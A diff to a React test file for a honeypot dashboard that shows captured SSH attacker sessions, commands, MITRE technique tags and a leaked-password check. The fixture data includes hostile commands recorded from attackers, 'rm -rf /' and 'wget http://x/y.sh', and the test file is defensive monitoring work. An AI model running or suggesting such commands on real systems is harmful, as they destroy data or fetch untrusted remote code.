@@ -1,4 +1,4 @@
-import { describe, it, expect, vi, afterEach } from "vitest";
+import { describe, it, expect, vi, afterEach, beforeEach } from "vitest";
 import { render, screen, fireEvent, within, waitFor } from "@testing-library/react";
 import ErrorBoundary from "../components/common/ErrorBoundary";
 import SessionDrawer from "../components/SessionDrawer";
@@ -9,9 +9,6 @@ import PasswordCheck from "../components/PasswordCheck";
 import AreaSparkline from "../components/common/AreaSparkline";
 
 const noop = () => {};
-const fmtTs = (t) => (t ? `TS:${t}` : "—");
-const fmtDur = (ms) => `${Math.round((ms || 0) / 1000)}s`;
-const flag = () => "🏴";
 
 const SESSION = {
   session_id: "abc123",
@@ -60,8 +57,7 @@ describe("SessionDrawer", () => {
   const mitreById = { T1105: { id: "T1105", name: "Ingress Tool Transfer (T1105)", badgeColor: "" } };
 
   const drawerProps = {
-    data, loading: false, error: "", onClose: noop,
-    formatTimestamp: fmtTs, formatDuration: fmtDur, countryFlag: flag, mitreById,
+    data, loading: false, error: "", onClose: noop, mitreById,
   };
 
   it("renders the timeline as connect, login, then command with its technique", () => {
@@ -106,30 +102,37 @@ describe("CommandsPanel", () => {
   const props = {
     commands: [{ command: "rm -rf /", total: 5, unique_ips: 2, tags: ["T1490"] }],
     commandsError: "", commandsLoading: false, commandsTotal: 1,
-    commandFilter: "all", setCommandFilter: noop, isCommandFilterActive: false,
+    commandFilter: "all", setCommandFilter: noop,
     commandTagCounts: { T1490: 1, T1105: 0 },
     mitreSignatures: [
       { id: "T1490", name: "Impact (T1490)", description: "d", badgeColor: "" },
       { id: "T1105", name: "Ingress (T1105)", description: "d", badgeColor: "" },
     ],
     mitreById: { T1490: { id: "T1490", name: "Impact (T1490)", badgeColor: "" } },
-    search: "", onSearch: noop, pageSize: 100, isMobile: false,
+    search: "", onSearch: noop, pageSize: 100,
   };
 
   it("tags rows from the ids the API returns", () => {
-    render(<CommandsPanel {...props} />);
+    const { container } = render(<CommandsPanel {...props} />);
     expect(screen.getByText("rm -rf /")).toBeInTheDocument();
-    expect(screen.getAllByText("Impact (T1490)").length).toBeGreaterThan(0);
+    const row = container.querySelector("tbody tr");
+    expect(within(row).getByText("Impact")).toBeInTheDocument();
+    expect(within(row).getByText("T1490")).toBeInTheDocument();
   });
 
   it("disables technique chips that match nothing", () => {
     render(<CommandsPanel {...props} />);
-    expect(screen.getByRole("button", { name: /Ingress \(T1105\) \(0\)/ })).toBeDisabled();
-    expect(screen.getByRole("button", { name: /Impact \(T1490\) \(1\)/ })).toBeEnabled();
+    expect(screen.getByRole("button", { name: /Ingress \(T1105\), 0 commands/ })).toBeDisabled();
+    expect(screen.getByRole("button", { name: /Impact \(T1490\), 1 command$/ })).toBeEnabled();
+  });
+
+  it("separates thousands in the counts", () => {
+    render(<CommandsPanel {...props} commands={[{ command: "uname -a", total: 91383, unique_ips: 325, tags: [] }]} />);
+    expect(screen.getByText("91,383")).toBeInTheDocument();
   });
 
   it("explains an empty result differently when a filter is active", () => {
-    render(<CommandsPanel {...props} commands={[]} isCommandFilterActive commandFilter="T1105" />);
+    render(<CommandsPanel {...props} commands={[]} commandFilter="T1105" />);
     expect(screen.getByText(/no commands match the current search or filter/i)).toBeInTheDocument();
   });
 
@@ -159,7 +162,7 @@ describe("AreaSparkline", () => {
 
   it("handles an all-zero series without dividing by zero", () => {
     const { container } = render(<AreaSparkline data={[{ label: "a", value: 0 }, { label: "b", value: 0 }]} />);
-    const path = container.querySelector("path[stroke='#34d399']");
+    const path = container.querySelector("path[data-series='line']");
     expect(path.getAttribute("d")).not.toMatch(/NaN/);
   });
 
@@ -209,7 +212,7 @@ describe("FeaturedAttack", () => {
     ],
   };
   const mitreById = { T1105: { id: "T1105", name: "Ingress Tool Transfer (T1105)" } };
-  const props = { data: attack, loading: false, error: "", mitreById, countryFlag: flag };
+  const props = { data: attack, loading: false, error: "", mitreById };
 
   /** Reduced motion renders the whole session at once, which is deterministic. */
   const realMatchMedia = window.matchMedia;
@@ -385,7 +388,6 @@ describe("PasswordCheck", () => {
   const HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92";
   const props = {
     endpoint: "/api/public/cowrie/passwords/range",
-    formatNumber: (n) => String(n),
     uniqueCredCount: 203819,
   };
 
@@ -432,7 +434,7 @@ describe("PasswordCheck", () => {
     );
     render(<PasswordCheck {...props} />);
     await typeAndCheck("123456");
-    expect(await screen.findByText(/seen 4812 times/i)).toBeInTheDocument();
+    expect(await screen.findByText(/seen 4,812 times/i)).toBeInTheDocument();
     expect(screen.getByText("root")).toBeInTheDocument();
   });
 
@@ -488,21 +490,7 @@ describe("EventsPanel", () => {
     username: "root", password: "123456", command: "wget http://x/y.sh",
     session_id: "s1", country_iso: "CN",
   }];
-  const props = {
-    events, eventLimit: 50, formatTimestamp: fmtTs,
-    renderGeoPill: (ev) => <span>{ev.country_iso}</span>,
-  };
-
-  it("fills its grid cell instead of leaving dead space below the rows", () => {
-    // The panel sits beside a column of six stacked panels, so the grid
-    // stretches it far taller than its own content. Without a flex column the
-    // frame was drawn full height with the table stopping partway down.
-    const { container } = render(<EventsPanel {...props} />);
-    const root = container.firstChild;
-    expect(root.className).toMatch(/\bflex\b/);
-    expect(root.className).toMatch(/\bflex-col\b/);
-    expect(root.className).toMatch(/\bh-full\b/);
-  });
+  const props = { events, eventLimit: 50 };
 
   const EVENTS = [
     { timestamp: "2026-08-16T10:00:00Z", src_ip: "1.1.1.1", dest_port: 22,
@@ -513,6 +501,18 @@ describe("EventsPanel", () => {
       username: null, password: null, command: "wget http://x/y.sh", session_id: "c", country_iso: "CN" },
   ];
 
+  /** Makes the md breakpoint query match, as it would on a phone. */
+  const realMatchMedia = window.matchMedia;
+  const asPhone = () => {
+    window.matchMedia = (query) => ({
+      matches: query.includes("max-width"),
+      media: query,
+      addEventListener: vi.fn(), removeEventListener: vi.fn(),
+      addListener: vi.fn(), removeListener: vi.fn(), dispatchEvent: vi.fn(),
+    });
+  };
+  afterEach(() => { window.matchMedia = realMatchMedia; });
+
   it("weights rows by what actually happened", () => {
     // Most rows are a bot connecting and trying one password. The few that ran
     // commands used to look identical, which buried the only interesting thing
@@ -521,25 +521,36 @@ describe("EventsPanel", () => {
     const rows = [...container.querySelectorAll("tbody tr")];
     expect(rows).toHaveLength(3);
     const [connect, login, command] = rows;
-    expect(connect.className).toMatch(/opacity-55/);
-    expect(login.className).not.toMatch(/opacity-55/);
-    expect(command.className).toMatch(/bg-emerald-500/);
-    expect(command.className).not.toMatch(/opacity-55/);
+    expect(connect.className).toMatch(/opacity-60/);
+    expect(login.className).not.toMatch(/opacity-60/);
+    expect(command.className).toMatch(/bg-accent/);
+    expect(command.className).not.toMatch(/opacity-60/);
   });
 
   it("drops the table for cards on a phone", () => {
-    // A seven-column nowrap table on a 390px screen is a side-scrolling strip.
-    const { container } = render(<EventsPanel {...props} events={EVENTS} isMobile />);
+    // A multi-column nowrap table on a 390px screen is a side-scrolling strip.
+    asPhone();
+    const { container } = render(<EventsPanel {...props} events={EVENTS} />);
     expect(container.querySelector("table")).toBeNull();
     expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
     expect(screen.getByText("root / 123456")).toBeInTheDocument();
-    expect(screen.getByText(/connection only/)).toBeInTheDocument();
+    expect(screen.getByText(/connection only/i)).toBeInTheDocument();
   });
 
-  it("does not force a minimum width that would overflow a narrow phone", () => {
-    // min-w-[320px] plus page padding overflows a 320px viewport.
-    const { container } = render(<EventsPanel {...props} isMobile />);
-    expect(container.firstChild.className).not.toMatch(/min-w-\[/);
+  it("opens the session behind a row, by mouse or keyboard", () => {
+    const onOpenSession = vi.fn();
+    render(<EventsPanel {...props} events={EVENTS} onOpenSession={onOpenSession} />);
+    fireEvent.click(screen.getByTitle("Open session from 3.3.3.3"));
+    expect(onOpenSession).toHaveBeenCalledWith("c");
+    fireEvent.keyDown(screen.getByTitle("Open session from 2.2.2.2"), { key: "Enter" });
+    expect(onOpenSession).toHaveBeenCalledWith("b");
+  });
+
+  it("filters the batch by event type", () => {
+    const { container } = render(<EventsPanel {...props} events={EVENTS} />);
+    fireEvent.click(screen.getByRole("button", { name: "Commands" }));
+    expect(container.querySelectorAll("tbody tr")).toHaveLength(1);
+    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
   });
 
   it("renders an event row", () => {
@@ -551,5 +562,11 @@ describe("EventsPanel", () => {
   it("shows the waiting message when there is nothing yet", () => {
     render(<EventsPanel {...props} events={[]} />);
     expect(screen.getByText(/waiting for attackers/i)).toBeInTheDocument();
+  });
+
+  it("distinguishes a failed load from an empty feed", () => {
+    render(<EventsPanel {...props} events={[]} error="API error 502" />);
+    expect(screen.getByText(/failed to load events/i)).toBeInTheDocument();
+    expect(screen.queryByText(/waiting for attackers/i)).toBeNull();
   });
 });
